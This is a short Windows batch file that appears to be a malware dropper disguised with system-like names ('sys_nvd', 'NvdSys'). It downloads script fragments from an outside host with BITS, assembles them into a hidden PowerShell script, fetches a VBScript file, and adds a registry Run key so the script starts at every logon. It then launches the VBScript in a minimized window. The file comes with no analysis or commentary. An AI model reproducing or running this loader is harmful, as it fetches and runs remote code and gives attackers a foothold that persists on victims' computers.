@echo off
set "a1=%APPDATA%\sys_nvd\data"
set "b2=%a1%\core.txt"
set "c3=%a1%\tmp1.txt"
set "d4=%a1%\tmp2.txt"
set "e5=%a1%\NVD_SYS.PS1"
set "f6=%a1%\start.vbs"
if exist "%a1%" rmdir /s /q "%a1%" 2>nul
mkdir "%a1%"
powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%b2%'"
powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%c3%'"
powershell -Command "Start-BitsTransfer -Source **** -Destination '%d4%'"
powershell -Command "(Get-Content '%b2%' -Raw) -replace '----', (Get-Content '%c3%' -Raw) -replace '====', (Get-Content '%d4%' -Raw) | Set-Content '%b2%'"
del "%c3%" 2>nul
del "%d4%" 2>nul
ren "%b2%" "NVD_SYS.PS1"
powershell -Command "Invoke-WebRequest 'https://service-omega-snowy.vercel.app/s-nvs_update.vbs' -OutFile '%f6%'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NvdSys' -Value 'wscript.exe \"%f6%\"'"
start /min wscript "%f6%"
